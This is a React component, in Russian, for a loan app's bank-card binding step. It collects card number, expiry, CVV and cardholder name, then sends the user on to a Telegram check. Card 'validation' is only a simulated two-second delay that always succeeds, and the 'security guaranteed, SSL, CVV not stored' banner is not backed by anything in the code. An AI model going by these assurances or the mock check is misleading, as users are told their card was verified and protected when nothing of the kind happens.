import React, { useState } from 'react';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Button } from '@/components/ui/button';
import Icon from '@/components/ui/icon';

interface CardBindingStepProps {
  onSuccess: () => void;
  onSubmit: () => void;
  isSubmitting: boolean;
  phoneNumber: string;
}

const CardBindingStep: React.FC<CardBindingStepProps> = ({ onSuccess, onSubmit, isSubmitting, phoneNumber }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [isValidating, setIsValidating] = useState(false);
  const [isValidated, setIsValidated] = useState(false);

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const validateCard = async () => {
    setIsValidating(true);
    
    // Имитация проверки карты
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    setIsValidating(false);
    setIsValidated(true);
    
    // Вызываем onSuccess сразу после валидации
    onSuccess();
  };

  const isFormValid = cardNumber.replace(/\s/g, '').length === 16 && 
                     expiryDate.length === 5 && 
                     cvv.length === 3 && 
                     cardholderName.trim().length > 0;

  if (isValidated) {
    return (
      <div className="text-center space-y-6 py-8 animate-fade-in">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
          <Icon name="CheckCircle" size={40} className="text-green-600" />
        </div>
        <div className="space-y-2">
          <h3 className="text-xl font-bold text-green-600">Карта успешно привязана!</h3>
          <p className="text-gray-600">Карта {cardNumber.slice(-4)} готова к получению займа</p>
        </div>
        
        <Button
          onClick={onSubmit}
          disabled={isSubmitting}
          className="w-full bg-green-600 hover:bg-green-700 disabled:opacity-50 text-white py-3 mt-6"
        >
          {isSubmitting ? (
            <div className="flex items-center gap-2">
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              Проверяем Telegram...
            </div>
          ) : (
            <div className="flex items-center justify-center gap-2">
              <Icon name="MessageCircle" size={16} />
              Проверить Telegram
            </div>
          )}
        </Button>
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-fade-in">
      <div className="text-center mb-6">
        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <Icon name="CreditCard" size={32} className="text-blue-600" />
        </div>
        <h3 className="text-lg font-bold text-gray-800">Привязка банковской карты</h3>
        <p className="text-gray-600 text-sm">Для получения займа привяжите вашу карту</p>
      </div>

      <div className="space-y-4">
        <div className="space-y-2">
          <Label className="text-sm font-semibold text-gray-700">Номер карты *</Label>
          <Input
            type="text"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors font-mono text-lg"
            placeholder="1234 5678 9012 3456"
            maxLength={19}
            required
          />
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Label className="text-sm font-semibold text-gray-700">Срок действия *</Label>
            <Input
              type="text"
              value={expiryDate}
              onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
              className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors font-mono"
              placeholder="12/25"
              maxLength={5}
              required
            />
          </div>
          
          <div className="space-y-2">
            <Label className="text-sm font-semibold text-gray-700">CVV *</Label>
            <Input
              type="password"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 3))}
              className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors font-mono"
              placeholder="123"
              maxLength={3}
              required
            />
          </div>
        </div>

        <div className="space-y-2">
          <Label className="text-sm font-semibold text-gray-700">Имя держателя карты *</Label>
          <Input
            type="text"
            value={cardholderName}
            onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors"
            placeholder="IVAN PETROV"
            required
          />
        </div>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <div className="flex items-start gap-3">
          <Icon name="Shield" size={20} className="text-blue-600 mt-0.5" />
          <div className="text-sm text-blue-800">
            <p className="font-semibold mb-1">Безопасность гарантирована</p>
            <p>Ваши данные защищены SSL-шифрованием. Мы не сохраняем CVV код.</p>
          </div>
        </div>
      </div>

      <Button
        type="button"
        onClick={validateCard}
        disabled={!isFormValid || isValidating}
        className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white py-3"
      >
        {isValidating ? (
          <div className="flex items-center gap-2">
            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            Проверяем карту...
          </div>
        ) : (
          <div className="flex items-center justify-center gap-2">
            <Icon name="CreditCard" size={16} />
            Привязать карту
          </div>
        )}
      </Button>
    </div>
  );
};

export default CardBindingStep;